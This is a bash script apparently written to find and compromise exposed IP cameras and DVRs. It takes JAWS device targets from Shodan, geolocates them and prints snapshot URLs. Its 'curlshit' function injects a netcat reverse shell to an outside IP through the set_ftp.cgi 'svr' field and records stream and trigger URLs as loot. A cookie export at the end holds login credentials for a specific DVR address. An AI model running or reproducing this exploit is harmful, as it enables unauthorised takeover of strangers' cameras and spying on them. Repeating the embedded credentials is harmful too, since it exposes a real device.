#!/bin/bash

shw_grey () {
    echo $(tput bold)$(tput setaf 0) $@ $(tput sgr 0)
}

shw_norm () {
    echo $(tput bold)$(tput setaf 9) $@ $(tput sgr 0)
}
shw_norm1 () {
    echo $(tput bold)$(tput setaf 7) $@ $(tput sgr 0)
}

shw_info () {
    echo $(tput bold)$(tput setaf 4) $@ $(tput sgr 0)
}

shw_warn () {
    echo $(tput bold)$(tput setaf 2) $@ $(tput sgr 0)
}
shw_err ()  {
    echo $(tput bold)$(tput setaf 1) $@ $(tput sgr 0)
}

function HTTPCode(){

	Code=$(curl -o /dev/null --max-time 12 --silent --head --write-out '%{http_code}' $(echo $1) ) 

	if [ $Code -eq 200 ]; then
		shw_warn "Server Up!(Response $Code)" $1
		shw_norm1 $1
	elif [ $Code -eq 401 ]; then
		shw_warn "Server Up!(Response $Code)" $1
		shw_norm $1 
	else
		shw_err $1 "Down!("$Code")"
	fi
}


function curlshit(){

	echo $1":"$2 $3 $4
	echo 'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%2082.75.163.96%20'$5'%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0'  
	curl 'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%2082.75.163.96%20'$5'%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0' --max-time 10  > /dev/null

	Trigger='http://'$3':'$4'@'$1':'$2'/ftptest.cgi?next_url=test_ftp.htm&loginuse='$3'&loginpas='$4 
	echo "$Trigger" >> '/root/stuff/source/camtriggers.lst'
	echo 'http://'$3':'$4'@'$1':'$2'/videostream.cgi?loginuse='$3'&loginpas='$4 >> '/root/stuff/source/camstreams.lst'
	echo $(echo  'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%20666%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0') >> '/root/stuff/source/strip.lst' 

}

:>'/root/stuff/source/JAWStargets.lst'

shodan search 'JAWS/1.0.' --fields ip_str,port --separator ':' |awk -F ':' '{print $1 ":" $2}' >> '/root/stuff/source/JAWStargets.lst'
#cat '/root/stuff/source/JAWStargets.lst'

#python3 /root/stuff/tools/expcamera/exploit_camera.py -b 2 -l '/root/stuff/source/Goaheadtargets.lst' -v -o "/root/stuff/source/wificam_LOOT.lst"
#python3 /root/stuff/tools/expcamera/exploit_camera.py -b 2 -l '/root/stuff/source/JAWStargets.lst' -v -o "/root/stuff/source/dvr_LOOT.lst"
#cat "/root/stuff/source/dvr_LOOT.lst"
#wc -l "/root/stuff/source/dvr_LOOT.lst"

#for i in $(cat '/root/stuff/source/JAWStargets.lst' |sort -u |grep -w 'password'|tail -n $1 ); do
for i in $(cat '/root/stuff/source/JAWStargets.lst' ); do
	Geo="$(command geoiplookup $i)"
	shw_info "http://electroman.nl/snapshotrip.php?ip="$i"&sleep=10000"	
	shw_err $Geo
	#shw_info "http://"$i"/cgi-bin/snapshot.cgi?chn=1&u=admin&p=&q=0&d=1"
	#shw_info "http://"$i"/cgi-bin/snapshot.cgi?chn=2&u=admin&p=&q=0&d=1"
	#shw_info "http://"$i"/cgi-bin/snapshot.cgi?chn=3&u=admin&p=&q=0&d=1"
	#shw_info "http://"$i"/cgi-bin/snapshot.cgi?chn=4&u=admin&p=&q=0&d=1"

	IP=$(echo $i |awk -F ':' '{print $1}' )
	PORT=$(echo $i |awk -F ':' '{print $2}' )
	#NAME_PASS=$(echo $i |awk -F ',' '{print $3}'|awk -F ':' '{print $2}' )
	#echo $NAME_PASS >> "/root/stuff/source/webcam_passwords.lst"
	if [[ $IP ]]; then
		HTTPCode "http://"$IP":"$PORT
		#echo $IP $PORT
		#echo "HacKinG fTp BaCkDoOr: "$IP":"$PORT":admin:"$NAME_PASS;
		#curlshit $IP $PORT "admin" $NAME_PASS '666'
	fi
done
exit 

Cookie={
 "cookieManagerVersion": "1.4",
 "userAgent": "Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0",
 "cookies": [
 {
  "name": "dvr_clientport",
  "value": "8888",
  "domain": "37.34.250.2",
  "hostOnly": true,
  "path": "/",
  "secure": false,
  "httpOnly": false,
  "session": true,
  "storeId": "firefox-default"
 },
 {
  "name": "dvr_sensorcnt",
  "value": "4",
  "domain": "37.34.250.2",
  "hostOnly": true,
  "path": "/",
  "secure": false,
  "httpOnly": false,
  "session": true,
  "storeId": "firefox-default"
 },
 {
  "name": "dvr_pwd",
  "value": "123",
  "domain": "37.34.250.2",
  "hostOnly": true,
  "path": "/",
  "secure": false,
  "httpOnly": false,
  "session": true,
  "storeId": "firefox-default"
 },
 {
  "name": "dvr_camcnt",
  "value": "24",
  "domain": "37.34.250.2",
  "hostOnly": true,
  "path": "/",
  "secure": false,
  "httpOnly": false,
  "session": true,
  "storeId": "firefox-default"
 },
 {
  "name": "dvr_usr",
  "value": "123",
  "domain": "37.34.250.2",
  "hostOnly": true,
  "path": "/",
  "secure": false,
  "httpOnly": false,
  "session": true,
  "storeId": "firefox-default"
 }
]
}
